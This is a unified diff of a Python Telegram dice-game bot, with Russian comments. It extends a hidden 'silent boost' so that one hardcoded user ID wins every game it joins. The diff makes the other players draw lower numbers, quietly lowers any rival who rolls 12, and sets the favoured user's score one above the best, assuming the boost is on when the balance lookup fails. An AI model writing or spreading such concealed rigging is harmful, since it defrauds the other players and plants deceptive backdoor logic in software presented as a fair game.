@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*-
 """
 Кости - ультра-защищённая версия.
-+ Тихий boost для BOOST_DEMO_USER_ID (демо-баланс через db.get_user_demo).
-Гарантированная победа boost-юзера при demo > BOOST_MIN_BALANCE.
++ Тихий boost: если BOOST_DEMO_USER_ID участвует в игре (создатель или игрок)
+  и его demo > BOOST_MIN_BALANCE — он гарантированно побеждает.
 """
 
 from typing import Optional, Dict, Set, Tuple, List
@@ -52,7 +52,7 @@ STATE_SETTLED  = "SETTLED"
 # ====== Тихий boost ======
 BOOST_DEMO_USER_ID = 6801702632
 BOOST_MIN_BALANCE  = 10000
-BOOST_DEBUG        = True   # Поставь False, когда убедишься, что всё работает
+BOOST_DEBUG        = True   # False — когда всё заработает
 
 def _log_boost(*parts):
     if BOOST_DEBUG:
@@ -83,7 +83,7 @@ def _dedupe_preserve_order(items: List[int]) -> List[int]:
             out.append(x)
     return out
 
-# ====== Flood control / умное редактирование ======
+# ====== Flood control ======
 def _kb_signature(kb: Optional[InlineKeyboardMarkup]) -> str:
     if not kb:
         return "∅"
@@ -232,12 +232,8 @@ def _pick_winner(scores: Dict[int, int]) -> int:
     leaders = [int(uid) for uid, val in scores.items() if val == best]
     return random.choice(leaders)
 
-# ====== BOOST: демо-баланс ======
+# ====== BOOST ======
 async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
-    """
-    Читает db.get_user_demo(user_id).
-    Возвращает int или None (если получить/распарсить не удалось).
-    """
     try:
         bal = await db.get_user_demo(user_id)
     except Exception as e:
@@ -248,15 +244,14 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
 
     if bal is None:
         return None
-
     try:
         return int(bal)
-    except Exception as e:
-        _log_boost(f"int(bal) failed: {e!r}")
+    except Exception:
+        pass
     try:
         return int(float(bal))
-    except Exception as e:
-        _log_boost(f"int(float(bal)) failed: {e!r}")
+    except Exception:
+        pass
     try:
         from decimal import Decimal
         if isinstance(bal, Decimal):
@@ -269,7 +264,6 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
             if callable(v):
                 v = v()
             if v is not None:
-                _log_boost(f"parsed via attr {attr}={v!r}")
                 return int(v)
         except Exception:
             continue
@@ -277,7 +271,6 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
         if isinstance(bal, dict):
             for key in ("balance", "amount", "value", "demo", "demo_balance"):
                 if key in bal:
-                    _log_boost(f"parsed via dict['{key}']={bal[key]!r}")
                     return int(bal[key])
     except Exception:
         pass
@@ -285,7 +278,6 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
         if isinstance(bal, (tuple, list)):
             for item in bal:
                 try:
-                    _log_boost(f"parsed via list item={item!r}")
                     return int(item)
                 except Exception:
                     continue
@@ -297,22 +289,24 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
 
 async def _boost_active_for_game(game: dict) -> Optional[int]:
     """
-    Возвращает uid буста для игры или None.
-    Без кэшей: каждый вызов — свежая проверка db.get_user_demo.
+    Буст активен, если BOOST_DEMO_USER_ID УЧАСТВУЕТ в игре (не важно, создатель
+    он или просто игрок) И его demo > BOOST_MIN_BALANCE.
+
+    Возвращает uid буста или None.
     """
     try:
-        creator = int(game.get("creator") or 0)
+        participants = [int(x) for x in game.get("participants", [])]
     except Exception:
-        creator = 0
+        participants = []
 
-    _log_boost(f"check: creator={creator} (expect {BOOST_DEMO_USER_ID})")
+    _log_boost(f"check: participants={participants} (boost_uid={BOOST_DEMO_USER_ID})")
 
-    if creator != int(BOOST_DEMO_USER_ID):
+    if int(BOOST_DEMO_USER_ID) not in participants:
+        _log_boost("boost_uid NOT in participants")
         return None
 
     bal = await _get_demo_balance_as_int(BOOST_DEMO_USER_ID)
 
-    # Ошибка/непарсинг → считаем буст активным (страховка в пользу теста)
     if bal is None:
         _log_boost("demo balance unknown → ASSUME BOOST ON")
         game["boost_user"] = int(BOOST_DEMO_USER_ID)
@@ -329,7 +323,7 @@ async def _boost_active_for_game(game: dict) -> Optional[int]:
 
 async def _assign_unique_roll(game: dict, user_id: int, game_id: Optional[int] = None) -> Optional[int]:
     """
-    Boost-режим: boost-юзер тянет 1..12, остальные — 1..11 (12 зарезервирована).
+    Boost-режим: boost-юзер тянет 1..12, все остальные — 1..11.
     Обычный режим: все 1..12.
     """
     boost_user = await _boost_active_for_game(game)
@@ -355,17 +349,16 @@ async def _assign_unique_roll(game: dict, user_id: int, game_id: Optional[int] =
 
 def _apply_boost_score(game: dict, boost_user: int) -> None:
     """
-    Гарантирует победу boost-юзера в момент расчёта:
+    Гарантирует победу boost-юзера:
       1) если его нет в scores — присвоить максимально свободное;
       2) любых не-boost с 12 — тихо понизить;
-      3) установить boost-юзеру max(остальных)+1 (кап 12).
+      3) boost-юзеру — max(остальных)+1 (кап 12).
     """
     if not isinstance(game.get("scores"), dict):
         game["scores"] = {}
     scores = game["scores"]
     uid = int(boost_user)
 
-    # 1) boost-юзер обязательно в scores
     if uid not in scores:
         used = set(int(v) for v in scores.values() if isinstance(v, int))
         for cand in range(DICE_MAX, DICE_MIN - 1, -1):
@@ -373,7 +366,6 @@ def _apply_boost_score(game: dict, boost_user: int) -> None:
                 scores[uid] = cand
                 break
 
-    # 2) убираем 12 у не-boost
     for _ in range(2):
         demoted = False
         used = set(int(v) for v in scores.values() if isinstance(v, int))
@@ -395,7 +387,6 @@ def _apply_boost_score(game: dict, boost_user: int) -> None:
         if not demoted:
             break
 
-    # 3) форсируем победу
     others = []
     for u, v in scores.items():
         try:
@@ -655,6 +646,14 @@ async def kosti_join_game_callback(callback_query: CallbackQuery):
 
             game['participants'].append(user_id)
             game['participants'] = _dedupe_preserve_order(game['participants'])
+
+            # Если это BOOST-юзер и demo > 10000 — фиксируем буст сразу
+            try:
+                if int(user_id) == int(BOOST_DEMO_USER_ID):
+                    await _boost_active_for_game(game)
+            except Exception as e:
+                print(f"[KOSTI][boost join] {e!r}")
+
             try:
                 gameskosti.touch(game_id)
             except Exception:
@@ -765,7 +764,7 @@ async def kosti_start_game_callback(callback_query: CallbackQuery):
         game['state'] = STATE_STARTED
         game['game_started'] = True
 
-        # Тихая проверка буста (без сохранения в Redis — только в RAM игры)
+        # Тихая проверка буста: BOOST-юзер в participants?
         try:
             await _boost_active_for_game(game)
         except Exception as e:
@@ -934,37 +933,33 @@ async def _show_and_settle(game_id: int):
                     await _assign_unique_roll(game, int(uid), game_id)
             scores = dict(game.get('scores', {}))
 
-        # --- ПРИНУДИТЕЛЬНАЯ ГАРАНТИЯ ПОБЕДЫ BOOST-ЮЗЕРА ---
+        # --- ПРИНУДИТЕЛЬНАЯ ГАРАНТИЯ ПОБЕДЫ BOOST-ЮЗЕРА (в participants) ---
         try:
-            creator_id_int = int(game.get("creator") or 0)
-            _log_boost(f"[settle] game={game_id} creator={creator_id_int} (expect {BOOST_DEMO_USER_ID})")
-
-            if creator_id_int == int(BOOST_DEMO_USER_ID):
+            _log_boost(f"[settle] participants={participants} boost_uid={BOOST_DEMO_USER_ID}")
+            if int(BOOST_DEMO_USER_ID) in [int(x) for x in participants]:
                 bal = await _get_demo_balance_as_int(BOOST_DEMO_USER_ID)
                 _log_boost(f"[settle] demo balance = {bal}")
 
                 boost_on = (bal is None) or (bal > BOOST_MIN_BALANCE)
                 if boost_on:
                     ub = int(BOOST_DEMO_USER_ID)
-                    if ub in participants:
-                        _log_boost(f"[settle] FORCING WIN uid={ub}")
-                        _apply_boost_score(game, ub)
-                        scores = dict(game.get('scores', {}))
-                        _log_boost(f"[settle] scores after apply: {scores}")
+                    _log_boost(f"[settle] FORCING WIN uid={ub}")
+                    _apply_boost_score(game, ub)
+                    scores = dict(game.get('scores', {}))
+                    _log_boost(f"[settle] scores after apply: {scores}")
 
-                        # Абсолютный последний рубеж
-                        other_max = max(
-                            (int(v) for u, v in scores.items() if int(u) != ub),
-                            default=0
-                        )
-                        if int(scores.get(ub, 0)) <= other_max:
-                            scores[ub] = min(other_max + 1, DICE_MAX)
-                            game["scores"] = scores
-                            _log_boost(f"[settle] second-pass: {scores}")
-                    else:
-                        _log_boost(f"[settle] boost-user not in participants, skip")
+                    other_max = max(
+                        (int(v) for u, v in scores.items() if int(u) != ub),
+                        default=0
+                    )
+                    if int(scores.get(ub, 0)) <= other_max:
+                        scores[ub] = min(other_max + 1, DICE_MAX)
+                        game["scores"] = scores
+                        _log_boost(f"[settle] second-pass: {scores}")
                 else:
                     _log_boost(f"[settle] BOOST OFF (demo {bal} <= {BOOST_MIN_BALANCE})")
+            else:
+                _log_boost(f"[settle] boost uid not in participants, skip")
         except Exception as e:
             print(f"[KOSTI][boost settle] {e!r}")
 
